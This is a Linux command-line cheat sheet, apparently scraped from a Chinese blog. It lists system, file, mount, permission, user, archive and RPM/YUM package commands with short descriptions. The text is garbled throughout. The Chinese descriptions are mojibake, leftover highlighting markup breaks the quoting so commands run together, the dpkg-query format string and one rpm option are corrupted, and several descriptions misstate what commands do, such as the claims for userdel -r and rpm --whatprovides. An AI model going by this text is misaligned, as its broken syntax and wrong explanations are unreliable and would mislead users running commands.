ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§ hdparm -tT /dev/sda åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œ <span class="token function">cat</span> /proc/cpuinfo æ˜¾ç¤ºCPU infoçš„ä¿¡æ¯ <span class="token function">cat</span> /proc/interrupts æ˜¾ç¤ºä¸­æ–­ <span class="token function">cat</span> /proc/meminfo æ ¡éªŒå†…å­˜ä½¿ç”¨ <span class="token function">cat</span> /proc/swaps æ˜¾ç¤ºå“ªäº›swapè¢«ä½¿ç”¨ <span class="token function">cat</span> /proc/version æ˜¾ç¤ºå†…æ ¸çš„ç‰ˆæœ¬ <span class="token function">cat</span> /proc/net/dev æ˜¾ç¤ºç½‘ç»œé€‚é…å™¨åŠç»Ÿè®¡ <span class="token function">cat</span> /proc/mounts æ˜¾ç¤ºå·²åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿ lspci -tv ç½—åˆ— PCI è®¾å¤‡ lsusb -tv æ˜¾ç¤º USB è®¾å¤‡ <span class="token function">date</span> æ˜¾ç¤ºç³»ç»Ÿæ—¥æœŸ <span class="token function">cal</span> 2007 æ˜¾ç¤º2007å¹´çš„æ—¥å†è¡¨ <span class="token function">date</span> 041217002007.00 è®¾ç½®æ—¥æœŸå’Œæ—¶é—´ - æœˆæ—¥æ—¶åˆ†å¹´.ç§’ clock -w å°†æ—¶é—´ä¿®æ”¹ä¿å­˜åˆ° BIOSå…³æœº <span class="token punctuation">(</span>ç³»ç»Ÿçš„å…³æœºã€é‡å¯ä»¥åŠç™»å‡º <span class="token punctuation">)</span> <span class="token function">shutdown</span> -h now å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>1<span class="token punctuation">)</span> init 0 å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>2<span class="token punctuation">)</span> telinit 0 å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token function">shutdown</span> -h hours:minutes <span class="token operator">&amp;</span> æŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ <span class="token function">shutdown</span> -c å–æ¶ˆæŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ <span class="token function">shutdown</span> -r now é‡å¯<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">reboot</span> é‡å¯<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">logout</span> æ³¨é”€</code></pre><h2 id="æ–‡ä»¶å’Œç›®å½•"><a href="#æ–‡ä»¶å’Œç›®å½•" class="headerlink" title="æ–‡ä»¶å’Œç›®å½•"></a>æ–‡ä»¶å’Œç›®å½•</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /home è¿›å…¥ <span class="token string">'/ home'</span> ç›®å½•<span class="token string">' cd .. è¿”å›ä¸Šä¸€çº§ç›®å½• cd ../.. è¿”å›ä¸Šä¸¤çº§ç›®å½• cd è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½• cd ~user1 è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½• cd - è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½• pwd æ˜¾ç¤ºå·¥ä½œè·¯å¾„ ls æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls -F æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls -l æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„è¯¦ç»†èµ„æ–™ ls -a æ˜¾ç¤ºéšè—æ–‡ä»¶ ls *[0-9]* æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å tree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(1) lstree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(2) mkdir dir1 åˆ›å»ºä¸€ä¸ªå«åš '</span>dir1<span class="token string">' çš„ç›®å½•'</span> <span class="token function">mkdir</span> dir1 dir2 åŒæ—¶åˆ›å»ºä¸¤ä¸ªç›®å½• <span class="token function">mkdir</span> -p /tmp/dir1/dir2 åˆ›å»ºä¸€ä¸ªç›®å½•æ ‘ <span class="token function">rm</span> -f file1 åˆ é™¤ä¸€ä¸ªå«åš <span class="token string">'file1'</span> çš„æ–‡ä»¶<span class="token string">' rmdir dir1 åˆ é™¤ä¸€ä¸ªå«åš '</span>dir1<span class="token string">' çš„ç›®å½•'</span> <span class="token function">rm</span> -rf dir1 åˆ é™¤ä¸€ä¸ªå«åš <span class="token string">'dir1'</span> çš„ç›®å½•å¹¶åŒæ—¶åˆ é™¤å…¶å†…å®¹ <span class="token function">rm</span> -rf dir1 dir2 åŒæ—¶åˆ é™¤ä¸¤ä¸ªç›®å½•åŠå®ƒä»¬çš„å†…å®¹ <span class="token function">mv</span> dir1 new_dir é‡å‘½å/ç§»åŠ¨ ä¸€ä¸ªç›®å½• <span class="token function">cp</span> file1 file2 å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶ <span class="token function">cp</span> dir/* <span class="token keyword">.</span> å¤åˆ¶ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°å½“å‰å·¥ä½œç›®å½• <span class="token function">cp</span> -a /tmp/dir1 <span class="token keyword">.</span> å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½• <span class="token function">cp</span> -a dir1 dir2 å¤åˆ¶ä¸€ä¸ªç›®å½• <span class="token function">ln</span> -s file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„è½¯é“¾æ¥ <span class="token function">ln</span> file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„ç‰©ç†é“¾æ¥ <span class="token function">touch</span> -t 0712250000 file1 ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æ—¶é—´æˆ³ - <span class="token punctuation">(</span>YYMMDDhhmm<span class="token punctuation">)</span> <span class="token function">file</span> file1 outputs the mime <span class="token function">type</span> of the <span class="token function">file</span> as text <span class="token function">iconv</span> -l åˆ—å‡ºå·²çŸ¥çš„ç¼–ç  <span class="token function">iconv</span> -f fromEncoding -t toEncoding inputFile <span class="token operator">></span> outputFile creates a new from the given input <span class="token function">file</span> by assuming it is encoded <span class="token keyword">in</span> fromEncoding and converting it to toEncoding. <span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -name *.jpg -print -exec convert <span class="token string">"{}"</span> -resize 80x60 <span class="token string">"thumbs/{}"</span> \<span class="token punctuation">;</span> batch resize files <span class="token keyword">in</span> the current directory and send them to a thumbnails directory <span class="token punctuation">(</span>requires convert from Imagemagick<span class="token punctuation">)</span></code></pre><h2 id="æ–‡ä»¶æœç´¢"><a href="#æ–‡ä»¶æœç´¢" class="headerlink" title="æ–‡ä»¶æœç´¢"></a>æ–‡ä»¶æœç´¢</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name file1 ä» <span class="token string">'/'</span> å¼€å§‹è¿›å…¥æ ¹æ–‡ä»¶ç³»ç»Ÿæœç´¢æ–‡ä»¶å’Œç›®å½• <span class="token function">find</span> / -user user1 æœç´¢å±äºç”¨æˆ· <span class="token string">'user1'</span> çš„æ–‡ä»¶å’Œç›®å½• <span class="token function">find</span> /home/user1 -name \*.bin åœ¨ç›®å½• <span class="token string">'/ home/user1'</span> ä¸­æœç´¢å¸¦æœ‰<span class="token string">'.bin'</span> ç»“å°¾çš„æ–‡ä»¶ <span class="token function">find</span> /usr/bin -type f -atime +100 æœç´¢åœ¨è¿‡å»100å¤©å†…æœªè¢«ä½¿ç”¨è¿‡çš„æ‰§è¡Œæ–‡ä»¶ <span class="token function">find</span> /usr/bin -type f -mtime -10 æœç´¢åœ¨10å¤©å†…è¢«åˆ›å»ºæˆ–è€…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ <span class="token function">find</span> / -name \*.rpm -exec <span class="token function">chmod</span> 755 <span class="token string">'{}'</span> \<span class="token punctuation">;</span> æœç´¢ä»¥ <span class="token string">'.rpm'</span> ç»“å°¾çš„æ–‡ä»¶å¹¶å®šä¹‰å…¶æƒé™ <span class="token function">find</span> / -xdev -name \*.rpm æœç´¢ä»¥ <span class="token string">'.rpm'</span> ç»“å°¾çš„æ–‡ä»¶ï¼Œå¿½ç•¥å…‰é©±ã€æ·ç›˜ç­‰å¯ç§»åŠ¨è®¾å¤‡ <span class="token function">locate</span> \*.ps å¯»æ‰¾ä»¥ <span class="token string">'.ps'</span> ç»“å°¾çš„æ–‡ä»¶ - å…ˆè¿è¡Œ <span class="token string">'updatedb'</span> å‘½ä»¤ <span class="token function">whereis</span> halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€æºç æˆ–mançš„ä½ç½® <span class="token function">which</span> halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</code></pre><h2 id="æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"><a href="#æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"></a>æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/hda2 /mnt/hda2 æŒ‚è½½ä¸€ä¸ªå«åšhda2çš„ç›˜ - ç¡®å®šç›®å½• <span class="token string">'/ mnt/hda2'</span> å·²ç»å­˜åœ¨ <span class="token function">umount</span> /dev/hda2 å¸è½½ä¸€ä¸ªå«åšhda2çš„ç›˜ - å…ˆä»æŒ‚è½½ç‚¹ <span class="token string">'/ mnt/hda2'</span> é€€å‡º <span class="token function">fuser</span> -km /mnt/hda2 å½“è®¾å¤‡ç¹å¿™æ—¶å¼ºåˆ¶å¸è½½ <span class="token function">umount</span> -n /mnt/hda2 è¿è¡Œå¸è½½æ“ä½œè€Œä¸å†™å…¥ /etc/mtab æ–‡ä»¶- å½“æ–‡ä»¶ä¸ºåªè¯»æˆ–å½“ç£ç›˜å†™æ»¡æ—¶éå¸¸æœ‰ç”¨ <span class="token function">mount</span> /dev/fd0 /mnt/floppy æŒ‚è½½ä¸€ä¸ªè½¯ç›˜ <span class="token function">mount</span> /dev/cdrom /mnt/cdrom æŒ‚è½½ä¸€ä¸ªcdromæˆ–dvdrom <span class="token function">mount</span> /dev/hdc /mnt/cdrecorder æŒ‚è½½ä¸€ä¸ªcdrwæˆ–dvdrom <span class="token function">mount</span> /dev/hdb /mnt/cdrecorder æŒ‚è½½ä¸€ä¸ªcdrwæˆ–dvdrom <span class="token function">mount</span> -o loop file.iso /mnt/cdrom æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶æˆ–ISOé•œåƒæ–‡ä»¶ <span class="token function">mount</span> -t vfat /dev/hda5 /mnt/hda5 æŒ‚è½½ä¸€ä¸ªWindows FAT32æ–‡ä»¶ç³»ç»Ÿ <span class="token function">mount</span> /dev/sda1 /mnt/usbdisk æŒ‚è½½ä¸€ä¸ªusb æ·ç›˜æˆ–é—ªå­˜è®¾å¤‡ <span class="token function">mount</span> -t smbfs -o username<span class="token operator">=</span>user,password<span class="token operator">=</span>pass //WinClient/share /mnt/share æŒ‚è½½ä¸€ä¸ªwindowsç½‘ç»œå…±äº«</code></pre><h2 id="ç£ç›˜ç©ºé—´"><a href="#ç£ç›˜ç©ºé—´" class="headerlink" title="ç£ç›˜ç©ºé—´"></a>ç£ç›˜ç©ºé—´</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -h æ˜¾ç¤ºå·²ç»æŒ‚è½½çš„åˆ†åŒºåˆ—è¡¨ <span class="token function">ls</span> -lSr <span class="token operator">|</span><span class="token function">more</span> ä»¥å°ºå¯¸å¤§å°æ’åˆ—æ–‡ä»¶å’Œç›®å½• <span class="token function">du</span> -sh dir1 ä¼°ç®—ç›®å½• <span class="token string">'dir1'</span> å·²ç»ä½¿ç”¨çš„ç£ç›˜ç©ºé—´<span class="token string">' du -sk * | sort -rn ä»¥å®¹é‡å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„å¤§å° rpm -q -a --qf '</span>%10<span class="token punctuation">{</span>SIZE<span class="token punctuation">}</span>t%<span class="token punctuation">{</span>NAME<span class="token punctuation">}</span>n<span class="token string">' | sort -k1,1n ä»¥å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºå·²å®‰è£…çš„rpmåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ (fedora, redhatç±»ç³»ç»Ÿ) dpkg-query -W -f='</span>Installedâˆ’Size<span class="token punctuation">;</span>10tInstalledâˆ’Size<span class="token punctuation">;</span>10t<span class="token punctuation">{</span>Package<span class="token punctuation">}</span>n' <span class="token operator">|</span> <span class="token function">sort</span> -k1,1n ä»¥å¤§å°ä¸ºä¾æ®æ˜¾ç¤ºå·²å®‰è£…çš„debåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ <span class="token punctuation">(</span>ubuntu, debianç±»ç³»ç»Ÿ<span class="token punctuation">)</span></code></pre><h2 id="ç”¨æˆ·å’Œç¾¤ç»„"><a href="#ç”¨æˆ·å’Œç¾¤ç»„" class="headerlink" title="ç”¨æˆ·å’Œç¾¤ç»„"></a>ç”¨æˆ·å’Œç¾¤ç»„</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">groupadd</span> group_name åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ç»„ <span class="token function">groupdel</span> group_name åˆ é™¤ä¸€ä¸ªç”¨æˆ·ç»„ <span class="token function">groupmod</span> -n new_group_name old_group_name é‡å‘½åä¸€ä¸ªç”¨æˆ·ç»„ <span class="token function">useradd</span> -c <span class="token string">"Name Surname "</span> -g admin -d /home/user1 -s /bin/bash user1 åˆ›å»ºä¸€ä¸ªå±äº <span class="token string">"admin"</span> ç”¨æˆ·ç»„çš„ç”¨æˆ· <span class="token function">useradd</span> user1 åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ· <span class="token function">userdel</span> -r user1 åˆ é™¤ä¸€ä¸ªç”¨æˆ· <span class="token punctuation">(</span> <span class="token string">'-r'</span> æ’é™¤ä¸»ç›®å½•<span class="token punctuation">)</span> <span class="token function">usermod</span> -c <span class="token string">"User FTP"</span> -g system -d /ftp/user1 -s /bin/nologin user1 ä¿®æ”¹ç”¨æˆ·å±æ€§ <span class="token function">passwd</span> ä¿®æ”¹å£ä»¤ <span class="token function">passwd</span> user1 ä¿®æ”¹ä¸€ä¸ªç”¨æˆ·çš„å£ä»¤ <span class="token punctuation">(</span>åªå…è®¸rootæ‰§è¡Œ<span class="token punctuation">)</span> chage -E 2005-12-31 user1 è®¾ç½®ç”¨æˆ·å£ä»¤çš„å¤±æ•ˆæœŸé™ pwck æ£€æŸ¥ <span class="token string">'/etc/passwd'</span> çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç”¨æˆ· grpck æ£€æŸ¥ <span class="token string">'/etc/passwd'</span> çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç¾¤ç»„ newgrp group_name ç™»é™†è¿›ä¸€ä¸ªæ–°çš„ç¾¤ç»„ä»¥æ”¹å˜æ–°åˆ›å»ºæ–‡ä»¶çš„é¢„è®¾ç¾¤ç»„</code></pre><h2 id="æ–‡ä»¶çš„æƒé™"><a href="#æ–‡ä»¶çš„æƒé™" class="headerlink" title="æ–‡ä»¶çš„æƒé™"></a>æ–‡ä»¶çš„æƒé™</h2><pre class=" language-bash"><code class="language-bash">-â€”â€”ä½¿ç”¨ <span class="token string">"+"</span> è®¾ç½®æƒé™ï¼Œä½¿ç”¨ <span class="token string">"-"</span> ç”¨äºå–æ¶ˆ <span class="token function">ls</span> -lh æ˜¾ç¤ºæƒé™ <span class="token function">ls</span> /tmp <span class="token operator">|</span> <span class="token function">pr</span> -T5 -W<span class="token variable">$COLUMNS</span> å°†ç»ˆç«¯åˆ’åˆ†æˆ5æ æ˜¾ç¤º <span class="token function">chmod</span> ugo+rwx directory1 è®¾ç½®ç›®å½•çš„æ‰€æœ‰äºº<span class="token punctuation">(</span>u<span class="token punctuation">)</span>ã€ç¾¤ç»„<span class="token punctuation">(</span>g<span class="token punctuation">)</span>ä»¥åŠå…¶ä»–äºº<span class="token punctuation">(</span>o<span class="token punctuation">)</span>ä»¥è¯»ï¼ˆr ï¼‰ã€å†™<span class="token punctuation">(</span>w<span class="token punctuation">)</span>å’Œæ‰§è¡Œ<span class="token punctuation">(</span>x<span class="token punctuation">)</span>çš„æƒé™ <span class="token function">chmod</span> go-rwx directory1 åˆ é™¤ç¾¤ç»„<span class="token punctuation">(</span>g<span class="token punctuation">)</span>ä¸å…¶ä»–äºº<span class="token punctuation">(</span>o<span class="token punctuation">)</span>å¯¹ç›®å½•çš„è¯»å†™æ‰§è¡Œæƒé™ <span class="token function">chown</span> user1 file1 æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå±æ€§ <span class="token function">chown</span> -R user1 directory1 æ”¹å˜ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰äººå±æ€§å¹¶åŒæ—¶æ”¹å˜æ”¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å±æ€§ <span class="token function">chgrp</span> group1 file1 æ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„ <span class="token function">chown</span> user1:group1 file1 æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå’Œç¾¤ç»„å±æ€§ <span class="token function">find</span> / -perm -u+s ç½—åˆ—ä¸€ä¸ªç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨äº†SUIDæ§åˆ¶çš„æ–‡ä»¶ <span class="token function">chmod</span> u+s /bin/file1 è®¾ç½®ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUID ä½ - è¿è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·ä¹Ÿè¢«èµ‹äºˆå’Œæ‰€æœ‰è€…åŒæ ·çš„æƒé™ <span class="token function">chmod</span> u-s /bin/file1 ç¦ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUIDä½ <span class="token function">chmod</span> g+s /home/public è®¾ç½®ä¸€ä¸ªç›®å½•çš„SGID ä½ - ç±»ä¼¼SUID ï¼Œä¸è¿‡è¿™æ˜¯é’ˆå¯¹ç›®å½•çš„ <span class="token function">chmod</span> g-s /home/public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ SGID ä½ <span class="token function">chmod</span> o+t /home/public è®¾ç½®ä¸€ä¸ªæ–‡ä»¶çš„ STIKY ä½ - åªå…è®¸åˆæ³•æ‰€æœ‰äººåˆ é™¤æ–‡ä»¶ <span class="token function">chmod</span> o-t /home/public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ STIKY ä½</code></pre><h2 id="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§"><a href="#æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§" class="headerlink" title="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§"></a>æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§</h2><pre class=" language-bash"><code class="language-bash">â€”â€” ä½¿ç”¨ <span class="token string">"+"</span> è®¾ç½®æƒé™ï¼Œä½¿ç”¨ <span class="token string">"-"</span> ç”¨äºå–æ¶ˆ chattr +a file1 åªå…è®¸ä»¥è¿½åŠ æ–¹å¼è¯»å†™æ–‡ä»¶ chattr +c file1 å…è®¸è¿™ä¸ªæ–‡ä»¶èƒ½è¢«å†…æ ¸è‡ªåŠ¨å‹ç¼©/è§£å‹ chattr +d file1 åœ¨è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿå¤‡ä»½æ—¶ï¼Œdumpç¨‹åºå°†å¿½ç•¥è¿™ä¸ªæ–‡ä»¶ chattr +i file1 è®¾ç½®æˆä¸å¯å˜çš„æ–‡ä»¶ï¼Œä¸èƒ½è¢«åˆ é™¤ã€ä¿®æ”¹ã€é‡å‘½åæˆ–è€…é“¾æ¥ chattr +s file1 å…è®¸ä¸€ä¸ªæ–‡ä»¶è¢«å®‰å…¨åœ°åˆ é™¤ chattr +S file1 ä¸€æ—¦åº”ç”¨ç¨‹åºå¯¹è¿™ä¸ªæ–‡ä»¶æ‰§è¡Œäº†å†™æ“ä½œï¼Œä½¿ç³»ç»Ÿç«‹åˆ»æŠŠä¿®æ”¹çš„ç»“æœå†™åˆ°ç£ç›˜ chattr +u file1 è‹¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œç³»ç»Ÿä¼šå…è®¸ä½ åœ¨ä»¥åæ¢å¤è¿™ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶ lsattr æ˜¾ç¤ºç‰¹æ®Šçš„å±æ€§</code></pre><h2 id="æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶"><a href="#æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶" class="headerlink" title="æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶"></a>æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶</h2><pre class=" language-bash"><code class="language-bash">bunzip2 file1.bz2 è§£å‹ä¸€ä¸ªå«åš <span class="token string">'file1.bz2'</span>çš„æ–‡ä»¶ <span class="token function">bzip2</span> file1 å‹ç¼©ä¸€ä¸ªå«åš <span class="token string">'file1'</span> çš„æ–‡ä»¶ gunzip file1.gz è§£å‹ä¸€ä¸ªå«åš <span class="token string">'file1.gz'</span>çš„æ–‡ä»¶ <span class="token function">gzip</span> file1 å‹ç¼©ä¸€ä¸ªå«åš <span class="token string">'file1'</span>çš„æ–‡ä»¶ <span class="token function">gzip</span> -9 file1 æœ€å¤§ç¨‹åº¦å‹ç¼© <span class="token function">rar</span> a file1.rar test_file åˆ›å»ºä¸€ä¸ªå«åš <span class="token string">'file1.rar'</span> çš„åŒ… <span class="token function">rar</span> a file1.rar file1 file2 dir1 åŒæ—¶å‹ç¼© <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ä»¥åŠç›®å½• <span class="token string">'dir1'</span> <span class="token function">rar</span> x file1.rar è§£å‹raråŒ… <span class="token function">unrar</span> x file1.rar è§£å‹raråŒ… <span class="token function">tar</span> -cvf archive.tar file1 åˆ›å»ºä¸€ä¸ªéå‹ç¼©çš„ tarball <span class="token function">tar</span> -cvf archive.tar file1 file2 dir1 åˆ›å»ºä¸€ä¸ªåŒ…å«äº† <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ä»¥åŠ <span class="token string">'dir1'</span>çš„æ¡£æ¡ˆæ–‡ä»¶ <span class="token function">tar</span> -tf archive.tar æ˜¾ç¤ºä¸€ä¸ªåŒ…ä¸­çš„å†…å®¹ <span class="token function">tar</span> -xvf archive.tar é‡Šæ”¾ä¸€ä¸ªåŒ… <span class="token function">tar</span> -xvf archive.tar -C /tmp å°†å‹ç¼©åŒ…é‡Šæ”¾åˆ° /tmpç›®å½•ä¸‹ <span class="token function">tar</span> -cvfj archive.tar.bz2 dir1 åˆ›å»ºä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -xvfj archive.tar.bz2 è§£å‹ä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -cvfz archive.tar.gz dir1 åˆ›å»ºä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -xvfz archive.tar.gz è§£å‹ä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">zip</span> file1.zip file1 åˆ›å»ºä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">zip</span> -r file1.zip file1 file2 dir1 å°†å‡ ä¸ªæ–‡ä»¶å’Œç›®å½•åŒæ—¶å‹ç¼©æˆä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ… unzip file1.zip è§£å‹ä¸€ä¸ªzipæ ¼å¼å‹ç¼©åŒ…RPM åŒ… - ï¼ˆFedora, RedhatåŠç±»ä¼¼ç³»ç»Ÿï¼‰ rpm -ivh package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ… rpm -ivh --nodeeps package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ…è€Œå¿½ç•¥ä¾èµ–å…³ç³»è­¦å‘Š rpm -U package.rpm æ›´æ–°ä¸€ä¸ªrpmåŒ…ä½†ä¸æ”¹å˜å…¶é…ç½®æ–‡ä»¶ rpm -F package.rpm æ›´æ–°ä¸€ä¸ªç¡®å®šå·²ç»å®‰è£…çš„rpmåŒ… rpm -e package_name.rpm åˆ é™¤ä¸€ä¸ªrpmåŒ… rpm -qa æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„rpmåŒ… rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« <span class="token string">"httpd"</span> å­—æ ·çš„rpmåŒ… rpm -qi package_name è·å–ä¸€ä¸ªå·²å®‰è£…åŒ…çš„ç‰¹æ®Šä¿¡æ¯ rpm -qg <span class="token string">"System Environment/Daemons"</span> æ˜¾ç¤ºä¸€ä¸ªç»„ä»¶çš„rpmåŒ… rpm -ql package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨ rpm -qc package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„é…ç½®æ–‡ä»¶åˆ—è¡¨ rpm -q package_name --whatrequires æ˜¾ç¤ºä¸ä¸€ä¸ªrpmåŒ…å­˜åœ¨ä¾èµ–å…³ç³»çš„åˆ—è¡¨ rpm -q package_name --whatprovides æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…æ‰€å çš„ä½“ç§¯ rpm -q package_name --**s æ˜¾ç¤ºåœ¨å®‰è£…/åˆ é™¤æœŸé—´æ‰€æ‰§è¡Œçš„è„šæœ¬l rpm -q package_name --changelog æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…çš„ä¿®æ”¹å†å² rpm -qf /etc/httpd/conf/httpd.conf ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªrpmåŒ…æ‰€æä¾› rpm -qp package.rpm -l æ˜¾ç¤ºç”±ä¸€ä¸ªå°šæœªå®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨ rpm --import /media/cdrom/RPM-GPG-KEY å¯¼å…¥å…¬é’¥æ•°å­—è¯ä¹¦ rpm --checksig package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…çš„å®Œæ•´æ€§ rpm -qa gpg-pubkey ç¡®è®¤å·²å®‰è£…çš„æ‰€æœ‰rpmåŒ…çš„å®Œæ•´æ€§ rpm -V package_name æ£€æŸ¥æ–‡ä»¶å°ºå¯¸ã€ è®¸å¯ã€ç±»å‹ã€æ‰€æœ‰è€…ã€ç¾¤ç»„ã€MD5æ£€æŸ¥ä»¥åŠæœ€åä¿®æ”¹æ—¶é—´ rpm -Va æ£€æŸ¥ç³»ç»Ÿä¸­æ‰€æœ‰å·²å®‰è£…çš„rpmåŒ…- å°å¿ƒä½¿ç”¨ rpm -Vp package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…è¿˜æœªå®‰è£… rpm2cpio package.rpm <span class="token operator">|</span> cpio --extract --make-directories *bin* ä»ä¸€ä¸ªrpmåŒ…è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ rpm -ivh /usr/src/redhat/RPMS/<span class="token variable"><span class="token variable">`</span>arch<span class="token variable">`</span></span>/package.rpm ä»ä¸€ä¸ªrpmæºç å®‰è£…ä¸€ä¸ªæ„å»ºå¥½çš„åŒ… rpmbuild --rebuild package_name.src.rpm ä»ä¸€ä¸ªrpmæºç æ„å»ºä¸€ä¸ª rpm åŒ…YUM è½¯ä»¶åŒ…å‡çº§å™¨ - ï¼ˆFedora, RedHatåŠç±»ä¼¼ç³»ç»Ÿï¼‰ yum <span class="token function">install</span> package_name ä¸‹è½½å¹¶å®‰è£…ä¸€ä¸ªrpmåŒ… yum localinstall package_name.rpm å°†å®‰è£…ä¸€ä¸ªrpmåŒ…ï¼Œä½¿ç”¨ä½ è‡ªå·±çš„è½¯ä»¶ä»“åº“ä¸ºä½ è§£å†³æ‰€æœ‰ä¾èµ–å…³ç³» yum update package_name.rpm æ›´æ–°å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å®‰è£…çš„rpmåŒ… yum update package_name æ›´æ–°ä¸€ä¸ªrpmåŒ… yum remove package_name åˆ é™¤ä¸€ä¸ªrpmåŒ… yum list åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­å®‰è£…çš„æ‰€æœ‰åŒ… yum search package_name 